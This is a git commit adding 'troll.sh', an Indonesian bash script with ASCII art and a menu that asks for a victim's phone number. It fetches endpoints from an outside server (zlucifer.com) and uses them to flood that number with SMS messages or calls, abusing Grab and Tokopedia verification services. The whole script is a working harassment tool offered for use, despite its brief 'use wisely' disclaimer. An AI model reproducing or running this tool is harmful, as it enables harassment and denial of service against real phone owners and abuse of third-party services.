c52d723cefbf00f47c93fdee236e6f2599b51c41
Henrycko <49187820+Henrycko@users.noreply.github.com>
2019-06-14 08:06:43 +0700

    Add files via upload

---
+++ troll.sh
@@ -0,0 +1,199 @@
+#!/bin/bash
+#PERINGATAN : KESALAHAN ATAU KEJAHATAN ADALAH TANGGUNG JAWAB DARI PENGGUNA!
+#GUNAKAN TOOLS UNTUK KEBAIKAN JANGAN DISALAH GUNAKAN :)
+troll(){
+    clear
+    sleep 0.03
+    echo "         _ "
+    sleep 0.03
+    echo "        /_)  _.-===-._ "
+    sleep 0.03
+    echo "       /  .; '_-.'- .'.     _ "
+    sleep 0.03
+    echo "  __ _/  /.'\ ._  '. , \   (_\ "
+    sleep 0.03
+    echo " /\_( \  |.'.-._'- .  '|     \ "
+    sleep 0.03
+    echo " |_)  /  |/'    ''--''\|     _\__ "
+    sleep 0.03
+    echo " \_)_|  /'  ._.   ._.  '\   / )(_\ "
+    sleep 0.03
+    echo " )/  (  \_      _      _/   \' (_| "
+    sleep 0.03
+    echo " /   /    \           /     _) (_/ "
+    sleep 0.03
+    echo " |   '',_ _'._'---'_.'_ _,.'    | \ "
+    sleep 0.03
+    echo " \    /  \ \  '''''  / / /     /   \ "
+    sleep 0.03
+    echo "  \_.'    \ \       / /  |   .' "
+    sleep 0.03
+    echo "   '--.,   \ \     / /  _;-'' "
+    sleep 0.03
+    echo "       '|   \ \   / /   | "
+    sleep 0.03
+    echo "       .;----'''''''----;. "
+    sleep 0.03
+    echo "      /(                 )\ "
+    sleep 0.03
+    echo "      \_''-------------''_/ "
+    sleep 0.03
+    echo "      | '';-----;-----;'' | "
+    sleep 0.03
+    echo "      | / : \ / : \ / : \ | "
+    sleep 0.03
+    echo "      |V.','.V.','.V.','.V| "
+    sleep 0.03
+    echo "      \'./_\.;./_\.;./_\.'/ "
+    sleep 0.03
+    echo "       ';..___________..;' "
+    sleep 0.03
+    echo " ============================="
+    sleep 2
+    echo " ==      Troll Project      =="
+    sleep 0.7
+    echo " ============================="
+}
+load(){
+    echo -e "\n"
+    bar=" >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> "
+    barlength=${#bar}
+    i=0
+    while((i<100)); do
+        n=$((i*barlength / 100))
+        printf "\e[00;32m\r[%-${barlength}s]\e[00m" "${bar:0:n}"
+        ((i += RANDOM%5+2))
+        sleep 0.2
+    done
+}
+get_sms=$(curl -s http://zlucifer.com/api/hackbae.php?request=sms)
+get_call=$(curl -s http://zlucifer.com/api/hackbae.php?request=call)
+mulai (){
+    echo "Gunakan Troll Project Lagi?"
+    echo "y/n?"
+    echo
+    read lagi
+    if [ $lagi = "y" ]; then
+            spam
+    else
+            echo "Terimakasih telah menggunakan Troll Project"
+    fi
+}
+#spam
+spam(){
+    clear
+    troll
+    echo
+    echo "[1] Spam SMS"
+    echo "[2] Spam Telp"
+    echo "[3] Close Troll Project"
+    echo
+    echo "1/2/3?"
+    read pilih
+    if [ $pilih = "1" ]; then
+            echo "Troll Spam SMS"
+            #function spam
+            echo
+            echo "Silahkan masukan nomor telp target"
+            echo contoh 08123456789
+            read target # masukin no telp
+            echo
+            echo "Berapa jumlah SMS yang mau dikirim?"
+            read paket
+            echo
+            echo Apakah nomor $target "dan SMS dikirim "$paket" sudah benar?"
+            echo y/n?
+            read confirm
+            echo
+            if [ $confirm = "y" ]; then
+                    load
+                    clear
+                    echo Melakukan spam SMS ke nomor $target
+                    echo
+                    echo "Jangan close aplikasi sebelum spam selesai"
+                    echo "========================================"
+                    target_do=$get_sms'/sms.php?nomor='$target'&paket='$paket
+                    CURL_RESPONSE=`curl -s -o /dev/null -w "%{http_code}" $target_do`
+                    echo " Gunakan tools dengan bijak!"
+                    echo
+                    echo " Love u always "
+                    echo " -Henrycko"
+                    echo "======================================="
+            else
+                    echo "Kesalahan"
+            fi
+        mulai
+    elif [ $pilih = "2" ]; then
+            echo "Troll Spam Call"
+            #function spam
+            echo
+            echo "Silahkan masukan nomor telp target"
+            echo contoh 08123456789
+            read target # masukin no telp
+            echo
+            echo "Gunakan API Grab/Tokped?"
+            echo "[1] GRAB"
+            echo "[2] TOKPED"
+            echo "1/2?"
+            read api
+            if [ $api = "1" ]; then
+                  api_spam="grab"
+            else
+                  api_spam="toped"
+            fi
+            echo Apakah nomor $target dan spam menggunakan $api_spam "sudah benar?"
+            echo y/n?
+            read confirm
+            echo
+            if [ $confirm = "y" ]; then
+                  load
+                  clear
+                  echo Melakukan SPAM call ke nomor $target
+                  echo
+                  echo "Jangan close aplikasi sebelum spam selesai"
+                  echo "========================================"
+                  cek_target=`curl -s $get_call/call.php?nomor=$target"&method="$api_spam`
+                  echo -e $cek_target
+                  echo " Gunakan tools dengan bijak"
+                  echo
+                  echo " Love u always "
+                  echo " -Henrycko"
+                  echo "========================================"
+            else
+                  echo Kesalahan, silahkan coba lagi
+            fi
+        mulai
+    elif [ $pilih = "3" ]; then
+        echo "Terimakasih telah menggunakan Troll Project!"
+        close
+    else
+        clear
+        echo "Kesalahan"
+        mulai
+    fi
+}
+close(){
+    exit
+}
+clear
+echo "Loading.."
+load
+clear
+troll
+echo Selamat datang kak, Siapa nama kaka? #tulisan keluar
+read nick #membaca yang ditulis
+clear
+echo "Loading..."
+load
+clear
+troll
+echo Selamat datang $nick ":)"
+echo
+echo "Mulai Troll Project?"
+echo "y/n?"
+read mulai
+if [ $mulai = "y" ]; then
+      spam
+else
+      close
+fi
